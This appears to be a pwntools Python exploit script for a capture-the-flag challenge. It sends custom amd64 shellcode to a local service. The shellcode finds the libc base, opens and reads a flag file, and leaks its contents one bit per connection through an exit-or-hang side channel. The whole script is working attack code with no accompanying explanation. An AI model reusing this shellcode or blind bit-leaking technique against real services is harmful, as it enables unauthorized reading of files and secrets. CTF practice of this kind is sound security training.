#!/usr/bin/env python3
from pwn import *
import time
import sys

# SETTINGS
context.arch = 'amd64'
host = '127.0.0.1'
port = 13771

if len(sys.argv) > 1:
    host = sys.argv[1]

LIBC = "./libc.so.6"
libc = ELF(LIBC)

for j in range(0, 32):
    bin_buf = b''

    for i in range(7):
        bit_check = (2 ** i)
        r = remote(host, port)

        system = libc.symbols['system']
        getppid = libc.symbols['getppid']
        open_ = libc.symbols['open']
        read = libc.symbols['read']
        sleep = libc.symbols['sleep']
        mprotect = libc.symbols['mprotect']
        exit_ = libc.symbols['exit']

        # SPLOIT #
        # setup stage
        payload = asm("lea rbx, [rip]; sub rbx, 0x0d;") # get mmap chunk addr in rbx
        payload += asm("mov rax, fs:0x0; sub rax, 0x5580; sub rax, 0x1ed040;") # rax is libc-base now
        payload += asm("mov rsp, fs:0x300; add rsp, 0x30; mov r9, rax;") # fix stack

        # open "/tmp/flag.txt", read on stack
        payload += asm("mov rdi, rbx; add rdi, 0x206;") # set arg to open
        payload += asm("mov rcx, r9; add rcx, {}; call rcx;".format(hex(open_))) 

        # read file
        payload += asm("xor rdi, rdi; mov rsi, rsp; add rsi, 0x400; mov rdx, 0x100;")
        payload += asm("mov rcx, r9; add rcx, {}; call rcx".format(hex(read)))

        # check bit
        payload += asm("mov r10, rsi; mov sil, byte ptr[r10 + {}]; test sil, {}; jnz $+0x20".format(hex(j), bit_check))
        payload += asm("mov rdi, 3; mov rcx, r9; add rcx, {}; call rcx".format(hex(exit_)))
        payload += asm("nop;") * 32
        payload += asm("mov rdi, rbx; mov rsi, 0x1000; mov rdx, 0x7;")
        payload += asm("mov rcx, r9; add rcx, {}; call rcx".format(hex(mprotect)))
        payload += asm("mov qword ptr[rbx], rdi;")

        payload = payload.ljust(0x200, b'\x90')
        payload += b"./flag.txt\x00"

        r.sendlineafter(b": ", payload + b"\xeb\xfe")
        r.settimeout(0.3)

        try:
            data = r.recvline()
        except:
            r.close()
            continue

        if b"{-}" in data:
            bin_buf += b'1'
        else:
            bin_buf += b'0'
        r.close()

    chr_ = chr(int("0b" + bin_buf[::-1].decode(), 2))
    print(chr_, end='')